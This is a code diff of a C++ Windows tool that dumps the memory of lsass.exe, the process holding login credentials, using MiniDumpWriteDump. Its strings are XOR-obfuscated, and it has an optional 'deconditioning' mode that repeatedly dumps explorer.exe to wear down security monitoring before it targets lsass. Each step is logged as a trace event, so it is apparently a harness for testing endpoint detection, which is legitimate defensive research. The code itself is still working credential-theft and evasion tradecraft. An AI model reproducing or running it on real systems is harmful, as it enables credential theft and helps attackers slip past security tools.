@@ -7,6 +7,7 @@
 #include <fstream>
 #include <sstream>
 #include <thread>
+#include <vector>
 #include <TraceLoggingProvider.h>
 
 #pragma comment(lib, "dbghelp.lib")
@@ -134,6 +135,25 @@ int main(int argc, char** argv) {
     msg << "' config";
     print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
 
+    msg << "Before creating proc snapshot";
+    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
+
+    // create a snapshot of running procs
+    DWORD pid = 0;
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) {
+        msg << "CreateToolhelp failed";
+        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
+        Sleep(sleep_between_steps_ms);
+        return 1;
+    }
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(pe);
+
+    msg << "After creating proc snapshot";
+    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
+    Sleep(sleep_between_steps_ms);
+
     // init strings
     // antiemulation and deconditioning also depend on obfuscation (anti signature)
 #if defined obfuscation || defined antiEmulation || defined deconditioning
@@ -143,10 +163,6 @@ int main(int argc, char** argv) {
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=QzpcXFVzZXJzXFxQdWJsaWNcXERvd25sb2Fkc1xcdGVzdC5kbXBcMA
     BYTE outFileBytes[] = { 0x02,0x78,0x1d,0x17,0x32,0x27,0x33,0x31,0x1d,0x12,0x34,0x20,0x2d,0x2b,0x22,0x1e,0x05,0x2d,0x36,0x2c,0x2d,0x2d,0x20,0x26,0x32,0x1e,0x35,0x27,0x32,0x36,0x6f,0x26,0x2c,0x32,0x41 };
     for (size_t i = 0; i < sizeof(outFileBytes); ++i) { outFileBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
-
-    // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
-    BYTE procBytes[] = { 0x2d,0x42,0x32,0x42,0x20,0x42,0x32,0x42,0x32,0x42,0x6f,0x42,0x24,0x42,0x39,0x42,0x24,0x42,0x41,0x42 };
-    for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
 
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
     BYTE dumpLibraryBytes[] = { 0x25,0x20,0x26,0x2a,0x24,0x2e,0x31,0x6c,0x25,0x2e,0x2d,0x42 };
@@ -161,50 +177,13 @@ int main(int argc, char** argv) {
     Sleep(sleep_between_steps_ms);
 #else
     BYTE outFileBytes[] = "C:\\Users\\Public\\Downloads\\test.dmp"; // literal string -> already \0 terminated
-    BYTE procBytes[] = { 0x6c,0x00,0x73,0x00,0x61,0x00,0x73,0x00,0x73,0x00,0x2e,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x00 }; // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
     BYTE dumpLibraryBytes[] = "dbghelp.dll";
     BYTE dumpFunctionBytes[] = "MiniDumpWriteDump";
 #endif
 
     char* outFile = reinterpret_cast<char*>(outFileBytes);
-    wchar_t* procW = reinterpret_cast<wchar_t*>(procBytes);
     char* dumpLibrary = reinterpret_cast<char*>(dumpLibraryBytes);
     char* dumpFunction = reinterpret_cast<char*>(dumpFunctionBytes);
-
-    DWORD pid = 0;
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) {
-        msg << "CreateToolhelp failed";
-        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
-        Sleep(sleep_between_steps_ms);
-        return 1;
-    }
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(pe);
-
-    // find lsass's PID (but do not interact with it yet!)
-    msg << "Before finding pid";
-    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
-
-    if (Process32First(snap, &pe)) {
-        do {
-            if (_wcsicmp(pe.szExeFile, procW) == 0) {
-                pid = pe.th32ProcessID;
-                break;
-            }
-        } while (Process32Next(snap, &pe));
-    }
-    if (pid != 0) {
-        msg << "After finding pid: " << pid;
-        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
-        Sleep(sleep_between_steps_ms);
-    }
-    else {
-        msg << "Unable to find pid";
-        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
-        Sleep(sleep_between_steps_ms);
-        return 1;
-    }
 
     msg << "Before opening out file";
     print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
@@ -258,8 +237,15 @@ int main(int argc, char** argv) {
     Sleep(sleep_between_steps_ms);
     */
 
+    /*
+    std::vector<const wchar_t*> procsNoDump = {
+        L"wininit.exe", L"smss.exe", L"services.exe", L"csrss.exe", L"svchost.exe", L"SecurityHealthService.exe", L"winlogon.exe", L"fontdrvhost.exe"
+    };
+    */
+
     constexpr int maxDumps = 100;
     int repetitions = 10;
+    int explorerPID = 0;
     for (int n = 0; n < repetitions; n++) {
 
         msg << "Starting deconditioning round " << n;
@@ -268,18 +254,19 @@ int main(int argc, char** argv) {
         int i = 0;
         if (Process32First(snap, &pe)) {
             do {
-                if (pe.th32ProcessID == pid) { // TODO, there are more procs that hang the system, find them
-                    continue; // do not interact with lsass yet
+                if (pe.th32ProcessID == explorerPID || _wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
+                    explorerPID = pe.th32ProcessID; // strcmp only the first run
+                    HANDLE hDecon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
+                    if (hDecon == NULL) {
+                        continue; // ignore errors, just open+dump as many procs as possible (except lsass)
+                    }
+                    // blindly dump and overwrite
+                    std::cout << "dumping " << pe.th32ProcessID << "\n";
+                    MiniDWriteD(hDecon, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+                    // and close proc handle again
+                    CloseHandle(hDecon);
+                    i++;
                 }
-                HANDLE hDecon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
-                if (hDecon == NULL) {
-                    continue; // ignore errors, just open+dump as many procs as possible (except lsass)
-                }
-                // blindly dump and overwrite
-                MiniDWriteD(hDecon, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
-                // and close proc handle again
-                CloseHandle(hDecon);
-                i++;
             } while (Process32Next(snap, &pe) && i < maxDumps);
         }
 
@@ -289,6 +276,50 @@ int main(int argc, char** argv) {
     }
 #endif
 
+    // init strings
+    // antiemulation and deconditioning also depend on obfuscation (anti signature)
+#if defined obfuscation || defined antiEmulation || defined deconditioning
+    msg << "Before decrypting target proc string";
+    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
+
+    // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
+    BYTE procBytes[] = { 0x2d,0x42,0x32,0x42,0x20,0x42,0x32,0x42,0x32,0x42,0x6f,0x42,0x24,0x42,0x39,0x42,0x24,0x42,0x41,0x42 };
+    for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
+
+    msg << "After decrypting target proc string";
+    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
+    Sleep(sleep_between_steps_ms);
+#else
+    BYTE procBytes[] = { 0x6c,0x00,0x73,0x00,0x61,0x00,0x73,0x00,0x73,0x00,0x2e,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x00 }; // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
+#endif
+
+    wchar_t* procW = reinterpret_cast<wchar_t*>(procBytes);
+
+    // find lsass's PID (but do not interact with it yet!)
+    msg << "Before finding pid";
+    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
+
+    if (Process32First(snap, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, procW) == 0) {
+                pid = pe.th32ProcessID;
+                break;
+            }
+        } while (Process32Next(snap, &pe));
+    }
+    if (pid != 0) {
+        msg << "After finding pid: " << pid;
+        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
+        Sleep(sleep_between_steps_ms);
+    }
+    else {
+        msg << "Unable to find pid";
+        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
+        Sleep(sleep_between_steps_ms);
+        CloseHandle(hFile);
+        return 1;
+    }
+
     msg << "Before opening process handle";
     print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
 
@@ -297,6 +328,7 @@ int main(int argc, char** argv) {
     if (hProcess == NULL) {
         msg << "Failed to open process: " << GetLastError();
         print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
+        CloseHandle(hFile);
         return 1;
     }
 
